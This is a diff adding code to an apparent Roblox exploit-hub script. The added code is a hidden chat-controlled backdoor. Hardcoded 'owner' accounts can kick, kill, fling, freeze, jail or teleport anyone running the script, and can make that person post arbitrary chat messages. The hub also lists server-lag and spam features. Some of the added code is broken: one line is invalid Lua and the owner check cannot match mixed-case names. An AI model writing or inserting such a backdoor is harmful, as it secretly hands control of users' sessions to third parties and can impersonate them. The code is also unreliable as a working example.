@@ -3,6 +3,143 @@ local LocalPlayer = Players.LocalPlayer
 local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Humanoid, RootPart = Character:WaitForChild("Humanoid"), Character:WaitForChild("HumanoidRootPart")
 local RE = ReplicatedStorage:WaitForChild("RE")
+local TweenService = game:GetService("TweenService")
+
+local success, Donos = pcall(function()
+    return local Donos = { -- loadstring tmbn
+    ["Roun95"] = true,
+    ["Deluxe_Studios"] = true,
+    ["SUKUNA_333857"] = true
+}
+end)
+
+if not success or type(Donos) ~= "table" then
+    Donos = {
+    ["Roun95"] = true,
+    ["Deluxe_Studios"] = true,
+    ["SUKUNA_333857"] = true
+}
+end
+
+local Jails = {}
+
+local function CriarCela(root)
+    local folder = Instance.new("Folder")
+    folder.Name = "JailCell"
+    folder.Parent = workspace
+
+    local size = Vector3.new(6, 10, 6)
+    local offsets = {
+        Vector3.new(0, -5, 0), -- chão
+        Vector3.new(0, 5, 0),  -- teto
+        Vector3.new(0, 0, -3), -- frente
+        Vector3.new(0, 0, 3),  -- trás
+        Vector3.new(-3, 0, 0), -- esquerda
+        Vector3.new(3, 0, 0),  -- direita
+    }
+
+    for _, off in ipairs(offsets) do
+        local part = Instance.new("Part")
+        part.Anchored = true
+        part.Size = size
+        part.CFrame = root.CFrame * CFrame.new(off)
+        part.Material = Enum.Material.Metal
+        part.BrickColor = BrickColor.new("Really black")
+        part.Parent = folder
+    end
+
+    return folder
+end
+
+local function ChatGlobal(msg)
+    pcall(function()
+        local tcs = game:GetService("TextChatService")
+        if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+            local channel = tcs.TextChannels.RBXGeneral
+            if channel then channel:SendAsync(msg) end
+        else
+            game:GetService("ReplicatedStorage")
+                .DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
+        end
+    end)
+end
+
+local function ExecutarComando(msgText, autor)
+    if not Donos[autor:lower()] then
+        return
+    end
+
+    local playerName = LocalPlayer.Name:lower()
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local root = character and character:FindFirstChild("HumanoidRootPart")
+
+    local function isCmd(cmd) return msgText:match(";"..cmd.."%s+"..playerName) end
+
+    if isCmd("kick") then
+        LocalPlayer:Kick("Você foi removido pelo Victory Lap Hub.")
+    elseif isCmd("kill") and character then
+        character:BreakJoints()
+    elseif isCmd("killplus") and character and root then
+        character:BreakJoints()
+        for i = 1, 10 do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(10,10,10)
+            part.Anchored = false
+            part.CanCollide = false
+            part.Material = Enum.Material.Neon
+            part.BrickColor = BrickColor.Random()
+            part.CFrame = root.CFrame
+            part.Parent = workspace
+            local bv = Instance.new("BodyVelocity")
+            bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
+            bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+            bv.Parent = part
+            game.Debris:AddItem(part, 3)
+        end
+    elseif isCmd("fling") and root then
+        TweenService:Create(
+            root,
+            TweenInfo.new(2, Enum.EasingStyle.Linear),
+            {CFrame = CFrame.new(50000, 5000000, 3972823)}
+        ):Play()
+    elseif isCmd("freeze") and humanoid and root then
+        humanoid.WalkSpeed = 0
+        root.Anchored = true
+    elseif msgText:match(";chat%s+" .. playerName) then
+        local msg = msgText:gsub(";chat%s+" .. playerName, ""):gsub("^%s+", "")
+        if msg ~= "" then ChatGlobal(msg) end
+    elseif msgText:match(";verifique") then
+        ChatGlobal("VictoryLap-" .. math.random(1000,9999))
+    elseif isCmd("bring") and root then
+        local autorPlayer = Players:FindFirstChild(autor)
+        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
+        end
+    elseif isCmd("jail") and root and not Jails[playerName] then
+        Jails[playerName] = CriarCela(root)
+        root.Anchored = true
+        if humanoid then humanoid.WalkSpeed = 0 end
+    elseif isCmd("unjail") and Jails[playerName] then
+        Jails[playerName]:Destroy()
+        Jails[playerName] = nil
+        root.Anchored = false
+        if humanoid then humanoid.WalkSpeed = 16 end
+    end
+end
+
+local tcs = game:GetService("TextChatService")
+if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
+    tcs.OnIncomingMessage = function(message)
+        if message.TextSource then
+            ExecutarComando(message.Text:lower(), message.TextSource.Name)
+        end
+    end
+else
+    Players.PlayerChatted:Connect(function(player, msg)
+        ExecutarComando(msg:lower(), player.Name)
+    end)
+end
 
 local Blur = Instance.new("BlurEffect", game.Lighting)
 Blur.Size = 20
@@ -4769,6 +4906,7 @@ ServerTab:Section({Title = "Lag Server", Icon = "boxes"})
 ServerTab:Section({Title = "Server Spam", Icon = "boxes"})
 
 ServerTab:Section({Title = "Server Commands", Icon = "boxes"})
+
 
 
 
